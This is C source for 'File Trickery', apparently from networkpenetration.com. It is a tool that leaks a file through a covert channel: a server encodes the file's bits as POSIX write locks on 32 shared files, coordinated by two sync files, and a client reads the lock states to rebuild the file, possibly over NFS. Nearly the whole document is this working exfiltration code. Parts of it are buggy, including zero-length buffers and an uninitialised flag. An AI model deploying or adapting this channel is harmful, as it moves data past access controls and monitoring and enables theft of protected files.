//filetrickery.c
//www.networkpenetration.com
//File Trickery - Stenoghrapied file copy using posix file locks.
//Ste Jones root@networkpenetration.com
//
//compile: gcc filetrickery.c -Wall -o filetrickery
//
//Tested on Linux Mandrake 8.0
//Tested over NFS between two mandrake 8 machines
//
//To Do
//-----
//1. spoof args
//2. remove trailing 0's by sending size at start of transfer
//3. randomize order
//4. add spoofed locks


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <fcntl.h>
#include <curses.h>
#include <time.h>

#define VER "0.91"

#define TIMEOUT 3 //after timeout save and close the obtained file
#define INITTIMEOUT 30 //time for client to wait for server to start
#define SLEEP 1 //used to lower CPU usage
#define VERBOSE 1//0: less info displayed, 1: loads of info displayed, 2: debug mode

static struct flock lockit, unlockit, wrlockit;
int makefile(void);
void how2use(char *progname);
void server(void);
void client(void);
int openfile(void);
int filesize(void);
void displaybits(char );
struct fname{
	char *files;
};

struct files {
	char *sync1;
	char *sync2;
	struct fname fn[32];
};

char *sfile;
char *cfile;

struct files f[1]; //ugh why does 0 not work?
int main(int argc, char *argv[])
{
	int c;
	
	sfile = NULL;
	cfile = NULL;
	
	lockit.l_type = F_RDLCK;
	lockit.l_whence = SEEK_SET;
	lockit.l_start = 0;
	lockit.l_len = 0;

	unlockit.l_type = F_UNLCK;
	unlockit.l_whence = SEEK_SET;
	unlockit.l_start = 0;
	unlockit.l_len = 0;
	
	wrlockit.l_type = F_WRLCK;
	wrlockit.l_whence = SEEK_SET;
	wrlockit.l_start = 0;
	wrlockit.l_len = 0;
		
	printf("\nFile Trickery " VER " from www.networkpenetration.com\n");
	printf("--------------------------------------------------\n");
	opterr = 0;
	
	while ((c = getopt(argc, argv, "c:s:")) != -1){
		switch(c){
			case 'c': cfile = optarg;
				  break;
		
			case 's': sfile = optarg;
				  break;

			default: how2use(argv[0]);
				 break;
		}
	}
	if (sfile && cfile) {
		printf("Select either (c)lient or (s)erver from the command line\n");
		exit(1);
	}
	
	if(argc != 37){
		how2use(argv[0]);
		exit(1);
	}
	
	f->sync1 = argv[3];
	f->sync2 = argv[4];
	c = 0;
	for(c=0; c<32; c++){
		f->fn[c].files = argv[c+5];
	}
	if (cfile) {
		printf("starting client\n");
		client();
		exit(1);
	}
	
	if (sfile) {
		printf("starting server\n");
		server();
		exit(1);
	}
	
	exit(1);
}

//(set values, flagA1, check flagB1, set values, flagA0, check flagB0)....
void server(void)
{
	unsigned char buf[0];
	FILE *fd;
	register int bytecount, bitcount, lockcount, filecount, p,q;
	int lockfd[32];
	size_t count;
	int syncfd1;
	register int syncfd2;
	struct flock test;
	register int lock;
	int fsize;
	

	fsize = filesize();
	printf("Leaking: %s  Size: %d bytes\n", sfile, fsize);
	
	fd = fopen(sfile, "r");
	if (!fd){
		printf("Doh.... %s can't be opened\n", sfile);
		exit(1);
	}
	bytecount = 0;
	memset(lockfd, '\0', sizeof(lockfd));
	count = 1;
	lock = 0; //alternate 0 1 for each pass to ensure sync
	
	while (count !=0){
		if(!lock) lock = 1; //lock starts on 1
		else lock = 0;
		
		filecount = 0;
		lockcount = 0;
		
		for(q=0; q<4 || count == 0; q++){
			memset(buf, '\0', sizeof(buf));
			count = fread(buf, 1, 1,fd);
			if (count == 0) {
				if(ferror(fd) !=0){
					printf("File Error\n");
					exit(0);
				}
				if(feof(fd) !=0){
					count = 0;
					break;
				}
			}

				for(bitcount=1; bitcount<=128; bitcount=bitcount*2){
				if (bitcount &buf[0]){
					if(VERBOSE) printf("byte %d bit:%d 1 ",bytecount,bitcount);
					if((lockfd[lockcount] = open(f->fn[filecount].files, O_WRONLY)) == -1) {
						printf("\nDoh.... %s can't be opened as %s\n", f->fn[filecount].files, strerror(errno));
						exit(1);
					}
	
					if(fcntl(lockfd[lockcount], F_SETLK, &wrlockit) == -1){
						printf("\nDoh.... Lock can't be set on %s as %s\n", f->fn[filecount].files, strerror(errno));
						exit(1);
					}
					else {
						if(VERBOSE) printf("locked file %s\n", f->fn[filecount].files);
					}
					lockcount++;
				} 
				else {
					if(VERBOSE) printf("byte %d bit:%d 0\n",bytecount,bitcount);
				}
				filecount++;
			}
	bytecount++;
		} 		
				

		if(lock) {
			if((syncfd1 = open(f->sync1, O_WRONLY)) == -1) {
				printf("\nDoh.... %s can't be opened as %s\n", f->sync1, strerror(errno));
				exit(1);
			}
			if(fcntl(syncfd1, F_SETLK, &wrlockit) == -1){
				printf("\nDoh.... Lock can't be set on %s as %s\n", f->sync1, strerror(errno));
				exit(1);
			}
		
			else {
				printf("locked %s.... waiting for client to read\n", f->sync1);
				goto checkit;
			}
		}

		if(!lock){
			if(fcntl(syncfd1, F_SETLK, &unlockit) == -1){
				printf("\nDoh.... Cant unlock %s as %s\n", f->sync1, strerror(errno));
				exit(1);
			}
			else {
				printf("unlocked %s.... waiting for client to read\n", f->sync1);
				if(close(syncfd1) == -1){
					printf("Doh.... close error on %s as %s\n", f->sync1, strerror(errno));
					exit(1);
				}
				goto checkit;
			}
		}
			
		checkit:
			if((syncfd2 = open(f->sync2, O_RDONLY)) == -1) {
				printf("\nDoh.... %s can't be opened as %s\n", f->sync2, strerror(errno));
				exit(1);
			}
			
			test.l_type = F_RDLCK;
			test.l_whence = SEEK_SET;
			test.l_start = 0;
			test.l_len = 0;
	
			if(lock){
				if(fcntl(syncfd2, F_GETLK, &test) == -1){
					printf("Doh.... Failed getting FLOCK info for %s as %s\n", f->sync2, strerror(errno));
					exit(1);
				}
				
				if(test.l_type == F_UNLCK){
					//not locked
					if(close(syncfd2) == -1){
						printf("Doh.... close error on %s as %s\n",f->sync2, strerror(errno));
						exit(1);
					}
					if(SLEEP) sleep(SLEEP);
					goto checkit;
				}

				else {
					//locked
					if(VERBOSE) printf("%s is locked.... setting file locks\n",f->sync2);
					if(VERBOSE == 2) printf("pid of owner: %d\n", test.l_pid);
					if(close(syncfd2) ==  -1){
						printf("Doh.... close error on %s as %s\n",f->sync2, strerror(errno));
						exit(1);
					}
				
				goto next;
				}
			}// end of lock
			
			if(!lock){
				if(fcntl(syncfd2, F_GETLK, &test) == -1){
					printf("Doh.... Failed getting FLOCK info for %s as %s\n", f->sync2, strerror(errno));
					exit(1);
				}

				if(test.l_type == F_UNLCK){
					printf("%s is not locked.... setting file locks\n", f->sync2);//continue 
					if(close(syncfd2) == -1){
						printf("Doh.... close error on %s as %s\n", f->sync2, strerror(errno));
						exit(1);
					}
					goto next;
				}
				else {
					if(close(syncfd2) == -1){
						printf("Doh.... close error on %s as %s\n",f->sync2, strerror(errno));
						exit(1);
					}
					if(SLEEP) sleep(SLEEP);
					goto checkit;
					//wait
				}
			}
			
			next:
			for(p=0; p<lockcount; p++){
				if(fcntl(lockfd[p], F_UNLCK, &unlockit) == -1){
					printf("Doh.... Can't unlock fd: %d as %s\n", p, strerror(errno));
					exit(1);
				}
				else {
					if(close(lockfd[p]) == -1){
						printf("close error on lockfd[%d] as %s\n",p, strerror(errno));
						exit(1);
					}
				}
			}
			if(VERBOSE == 2)printf("Unlocked all %d fd's\n", lockcount);
			if(count == 0) {
				break;
			}
		} 

		
	printf("Finished sending file\n");
	if(fclose(fd) !=0 ){
		printf("Fclose error on leaked file as %s\n", strerror(errno));
		exit(1);
	}
//send end of file
	exit(1);
}


//(check flagA1, read val, set flagB1, check flagA0, read val, flagB0).... check flagA1, read val, set flagB1
void client(void)
{
	FILE *fdout;
	int syncfd2, syncfd1, flag, init;
	//unsigned long filesize;
	struct flock test;
	register int lock, bytecount, byte, a, timea, timeb, fd, i, bit;
	size_t count;
	char fillme[4];


	init = 0;
	printf("Obtaining: %s\n", cfile);
	if((fdout = fopen(cfile, "w")) == NULL){
		printf("Doh.... %s can't be created as %s\n", cfile, strerror(errno));
		exit(1);
	}
	printf("Waiting for server to start....\n");
	bytecount = 0;
	lock = 1;
	timea = time(0);
	goto check;

	check:
		
		test.l_type = F_RDLCK;
		test.l_whence = SEEK_SET;
		test.l_start = 0;
		test.l_len = 0;
		timeb = time(0);
		
		if(SLEEP) sleep(SLEEP);
		if(flag){
			if(timeb > (timea + TIMEOUT)){
				//close locks
				printf("Time exceeded.... closed and saved %s\n", cfile);
				fflush(fdout);
				fclose(fdout);
				//run remove 0's
				exit(1);
			}
		}

		if(!flag){
			if(timeb > (timea+ INITTIMEOUT)){
				printf("Doh.... Server start-up timed out\n");
				fclose(fdout);
				exit(1);
			}
		}
				
		if(lock){
			if((syncfd1 = open(f->sync1, O_RDONLY)) == -1) {
				printf("\nO_WRONLY.... %s can't be opened as %s\n", f->sync1, strerror(errno));
				exit(1);
			}

			if(fcntl(syncfd1, F_GETLK, &test) == -1){
				printf("Doh.... Failed getting FLOCK info for %s as %s\n", f->sync1, strerror(errno));
				exit(1);
			}
				
			if(test.l_type == F_UNLCK){
				//not locked
				if(close(syncfd1) == -1){
					printf("Doh.... close error on %s as %s\n", f->sync1, strerror(errno));
					exit(1);
				}
				goto check;
			}

			else {
				//locked
				printf("%s locked.... reading file locks\n", f->sync1);
				if(VERBOSE == 2) printf("pid of owner: %d\n", test.l_pid);
				if(close(syncfd1) == -1){
					printf("Doh.... close error on %s as %s\n", f->sync1, strerror(errno));
					exit(1);
				}
				goto read;
			}
		}
		if(!lock){
			if((syncfd1 = open(f->sync1, O_RDONLY)) == -1) {
				printf("\nO_WRONLY.... %s can't be opened as %s\n", f->sync1, strerror(errno));
				exit(1);
			}

			if(fcntl(syncfd1, F_GETLK, &test) == -1){
				printf("Doh.... Failed getting FLOCK info for %s as %s\n", f->sync1, strerror(errno));
				exit(1);
			}
			if(test.l_type == F_UNLCK){
				//not locked
				printf("%s not locked.... reading file locks\n",f->sync1);
				if(close(syncfd1) == -1){
					printf("Doh.... close error on %s as %s\n", f->sync1, strerror(errno));
					exit(1);
				}
				goto read;
			}
			else {
				//locked
				if(close(syncfd1) == -1){
					printf("Doh.... close error on %s as %s\n", f->sync1, strerror(errno));
					exit(1);
				}
				goto check;
			}
		}
		
	read:
		bzero(fillme, sizeof(fillme));
		flag = 1;
		bit = 1;
		byte = 0;
		a = -1;
		init++;
		for(i=0; i<32; i++){
			a++;
			if(i == 0) {
				byte = 0;
			}
			if(a > 7){
				a = 0;
			}
	
			test.l_type = F_WRLCK;
			test.l_whence = SEEK_SET;
			test.l_start = 0;
			test.l_len = 0;
			if(VERBOSE) printf("byte %d bit %d = ", bytecount + byte, bit);
			
			if((fd = open(f->fn[i].files, O_RDONLY)) == -1) {
				printf("\nO_WRONLY Doh.... %s can't be opened\n", f->fn[i].files);
				exit(1);
			}

			if(fcntl(fd, F_GETLK, &test) == -1){
				printf("Doh.... Failed getting FLOCK info for %s as %s\n", f->fn[i].files, strerror(errno));
				exit(1);
			}
			
			if(test.l_type == F_UNLCK){
				//not locked
				fillme[byte] |= (0 << a);
				if(VERBOSE) printf("0\n");
				if(close(fd) == -1){
					printf("Doh.... close error on %s as %s\n", f->fn[i].files, strerror(errno));
					exit(1);
				}
			}
			
			else {
				//locked
				fillme[byte] |= (1 << a);
				if(VERBOSE) printf("1\n");
				if(close(fd) == -1){
					printf("Doh.... close error on %s as %s\n", f->fn[i].files, strerror(errno));
					exit(1);
				}
			}
			
			bit = bit*2;
			if(bit > 128){
				bit = 1;
				byte++;
			}
		}

		bytecount = bytecount + 4;
	
		if(VERBOSE == 2) displaybits(fillme[0]);
		if(VERBOSE == 2) displaybits(fillme[1]);
		if(VERBOSE == 2) displaybits(fillme[2]);
		if(VERBOSE == 2) displaybits(fillme[3]);
		count = fwrite(fillme, 4, 1, fdout);
		if(count != 1){
			printf("fwrite error\n");
			exit(1);
		}		
	
		goto lock;
	
	lock:
		
		if(lock){
			//lock sync2
			if((syncfd2 = open(f->sync2, O_WRONLY)) == -1) {
				printf("\nDoh.... %s can't be opened as %s\n", f->sync2, strerror(errno));
				exit(1);
			}
			if(fcntl(syncfd2, F_SETLK, &wrlockit) == -1){
				printf("\nDoh.... Lock can't be set on %s as %s\n", f->sync2, strerror(errno));
				exit(1);
			}
	
			else {
				printf("locked %s....\n",f->sync2);
				timea = time(0);
				lock = 0;
				goto check;
			}
		}
		if(!lock){
			if(fcntl(syncfd2, F_SETLK, &unlockit) == -1){
				printf("\nDoh.... Can;t unlock %s as %s\n", f->sync2, strerror(errno));
				exit(1);
			}
			else {
				printf("unlocked %s....\n", f->sync2);
				if(close(syncfd2) == -1){
					printf("Doh.... close error on %s as %s\n", f->sync2, strerror(errno));
					exit(1);
				}
				timea = time(0);
				lock = 1;
				goto check;
			}
		}	
}

int makefile(void)
{
	int filefd;
	char prefix[8];

	strncpy(prefix, "XXXXXXX", sizeof(prefix));	
	filefd = mkstemp(prefix);
	if(filefd == -1){
		if(errno == EINVAL) {
			printf("Doh.... template broke\n");
			return(-1);
		}
		if(errno == EEXIST) {
			printf("Doh.... couldn't create unique temp file\n");
			return(-1);
		}
	}
	printf("%s created\n", prefix);
	printf("FD = %d\n", filefd);
	return(filefd);
}

void displaybits(char printme)
{
	unsigned c, displayMask = 1 << 7;
	printf("%c = ", printme);
	for (c = 1; c <=8; c++){
		putchar(printme & displayMask ? '1' : '0');
		printme <<= 1;
	}
	putchar('\n');
}


int filesize(void)
{
	FILE *fd;
	int size, count;
	char buf[0];
	size = 0;
	fd = fopen(sfile, "r");
	if (!fd){
		printf("Doh.... %s can't be opened\n", sfile);
		exit(1);
	}
	for(;;){
		count = fread(buf, 1, 1, fd);
		if (count == 0) {
			if(ferror(fd) !=0){
				printf("File Error\n");
					exit(0);
			}
			if(feof(fd) !=0){
				goto end;				
			}
		}
		size++;
	}
	end:
		if(fclose(fd) !=0 ){
			printf("Fclose error on leaked file as %s\n", strerror(errno));
			exit(1);
		}
		return(size);
}

void how2use(char *progname)
{
	printf( "\nThe first two files are the sync files, the first one\n"\
		"used be the server and the second by the client. The rights\n"\
		"for all the files should be the server has read write access\n"\
		"and the client read access. The second file however should\n"\
		"have the opposite rights, the client should have read write\n"\
		"access and the server have read access\n\n"\
		"-s <file> Act as server\n"\
		"-c <file> Act as client\n"\
		"\n"\
		"Usage:\n"\
		"	%s -s sendme.txt <file1> <file2>.... 34 files required\n"\
		"	%s -c gotit.txt <file1> <file2>.... 34 files same order as server\n", progname, progname);
	
	exit(1);
}


